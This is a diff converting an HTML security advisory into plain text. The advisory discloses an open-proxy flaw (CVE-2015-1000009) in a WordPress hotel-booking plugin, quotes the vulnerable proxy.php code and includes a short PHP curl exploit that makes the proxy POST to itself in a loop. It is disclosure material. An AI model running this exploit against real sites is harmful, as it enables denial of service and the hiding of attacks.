@@ -1,48 +1,48 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 151&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Open proxy in Wordpress plugin google-adsense-and-hotel-booking v1.05&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-08-15&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/google-adsense-and-hotel-booking/">https://wordpress.org/plugins/google-adsense-and-hotel-booking/</a>"&gt;<a href="https://wordpress.org/plugins/google-adsense-and-hotel-booking/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/google-adsense-and-hotel-booking/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/jelyhost/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/jelyhost/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-08-15&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Automatically insert Google Adsense ads and Hotel Reservations.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in ./plugin/google-adsense-and-hotel-booking/proxy.php allows an arbitrary user to proxy POST requests
-though the host site. This may allow attackers to hide attacks, or DoS a site if the POST request is pointed back 
-at itself causing a loop:
-</p>
-<p>  3 $url = $<u>POST[&amp;#039;url&amp;#039;];<br/>
-  4 ini</u>set(&amp;quot;allow_url_fopen&amp;quot;, 1);
-  5 $data = array();<br/>
-  6 while(list($n,$v) = each($<u>POST)){$data[] = &amp;quot;$n=$v&amp;quot;;}
-  7 $data = implode(&amp;#039;&amp;amp;&amp;#039;, $data);
-  8 $url = parse</u>url($url);<br/>
-  9 $host = $url[&amp;#039;host&amp;#039;];<br/>
- 10 $path = $url[&amp;#039;path&amp;#039;];<br/>
- 11 $port = 80;<br/>
- 12 $data_length = strlen($data);<br/>
- 13 $header  = &amp;quot;POST $path HTTP/1.0\r\n&amp;quot;;
- 14 $header .= &amp;quot;Host: $host\r\n&amp;quot;;
- 15 $header .= &amp;quot;User-Agent: DoCoMo/1.0/P503i\r\n&amp;quot;;
- 16 $header .= &amp;quot;Content-type: application/x-www-form-urlencoded\r\n&amp;quot;;
- 17 $header .= &amp;quot;Content-length: $data_length\r\n&amp;quot;;
- 18 $header .= &amp;quot;\r\n&amp;quot;;<br/>
- 19 $fp = fsockopen($host,$port,$err_num,$err_msg,120);
- 20 $response =&amp;#039;&amp;#039;;<br/>
- 21 fputs($fp, $header . $data);<br/>
- 22 while(trim(fgets($fp,4096)) != &amp;#039;&amp;#039;);//Retira o cabecalho HTTP
- 23 while(!feof($fp)){$response .= fgets($fp,4096);}
- 24 // close the socket connection:<br/>
- 25 fclose($fp);<br/>
- 26 echo $response;<br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-1000009&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=151"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;'<a href="http://www.example.com/wp-content/plugins/google-adsense-and-hotel-booking/proxy.php">http://www.example.com/wp-content/plugins/google-adsense-and-hotel-booking/proxy.php</a>'&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;POST to &lt;span style="color: #006699; font-weight: bold;"&gt;$target_url&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000088;"&gt;$post&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/array">http://www.php.net/array</a>"&gt;&lt;span style="color: #990000;"&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'url'&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt; &lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;'url'&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&amp;gt;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000088;"&gt;$ch&lt;/span&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/curl_init">http://www.php.net/curl_init</a>"&gt;&lt;span style="color: #990000;"&gt;curl_init&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_URL&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #000088;"&gt;$target_url&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POST&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_POSTFIELDS&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #000088;"&gt;$post&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_setopt">http://www.php.net/curl_setopt</a>"&gt;&lt;span style="color: #990000;"&gt;curl_setopt&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt; CURLOPT_RETURNTRANSFER&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;a href="<a href="http://www.php.net/curl_exec">http://www.php.net/curl_exec</a>"&gt;&lt;span style="color: #990000;"&gt;curl_exec&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;a href="<a href="http://www.php.net/curl_close">http://www.php.net/curl_close</a>"&gt;&lt;span style="color: #990000;"&gt;curl_close&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #000088;"&gt;$ch&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;#####################################&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #000088;"&gt;$result&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;#####################################&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #000000; font-weight: bold;"&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=151">http://www.vapidlabs.com/advisory.php?v=151</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=151&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=151&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 151
+Title: Open proxy in Wordpress plugin google-adsense-and-hotel-booking v1.05
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-08-15
+Download Site: https://wordpress.org/plugins/google-adsense-and-hotel-booking/
+Vendor:https://profiles.wordpress.org/jelyhost/
+Vendor Notified: 2015-08-15
+Vendor Contact:
+Description: Automatically insert Google Adsense ads and Hotel Reservations.
+Vulnerability:
+The code in ./plugin/google-adsense-and-hotel-booking/proxy.php allows an
+arbitrary user to proxy POST requests though the host site. This may allow
+attackers to hide attacks, or DoS a site if the POST request is pointed back at
+itself causing a loop: 3 $url = $_POST['url']; 4 ini_set("allow_url_fopen", 1);
+5 $data = array(); 6 while(list($n,$v) = each($_POST)){$data[] = "$n=$v";} 7
+$data = implode('&', $data); 8 $url = parse_url($url); 9 $host = $url['host'];
+10 $path = $url['path']; 11 $port = 80; 12 $data_length = strlen($data); 13
+$header = "POST $path HTTP/1.0\r\n"; 14 $header .= "Host: $host\r\n"; 15
+$header .= "User-Agent: DoCoMo/1.0/P503i\r\n"; 16 $header .= "Content-type:
+application/x-www-form-urlencoded\r\n"; 17 $header .= "Content-length:
+$data_length\r\n"; 18 $header .= "\r\n"; 19 $fp = fsockopen
+($host,$port,$err_num,$err_msg,120); 20 $response =''; 21 fputs($fp, $header .
+$data); 22 while(trim(fgets($fp,4096)) != '');//Retira o cabecalho HTTP 23
+while(!feof($fp)){$response .= fgets($fp,4096);} 24 // close the socket
+connection: 25 fclose($fp); 26 echo $response;
+CVE-2015-1000009
+JSON:Export
+Exploit Code:
+   1. <?php
+   2.         $target_url = 'http://www.example.com/wp-content/plugins/google-
+      adsense-and-hotel-booking/proxy.php';
+   3.         echo "POST to $target_url";
+   4.         $post = array('url' => $target_url,'url'=>$target_url);
+   5.  
+   6.         $ch = curl_init();
+   7.         curl_setopt($ch, CURLOPT_URL,$target_url);
+   8.         curl_setopt($ch, CURLOPT_POST,1);
+   9.         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  10.         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+  11.         $result=curl_exec ($ch);
+  12.         curl_close ($ch);
+  13.         echo "#####################################";
+  14.         echo $result;
+  15.         echo "#####################################";
+  16. ?>
+  17.  
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=151
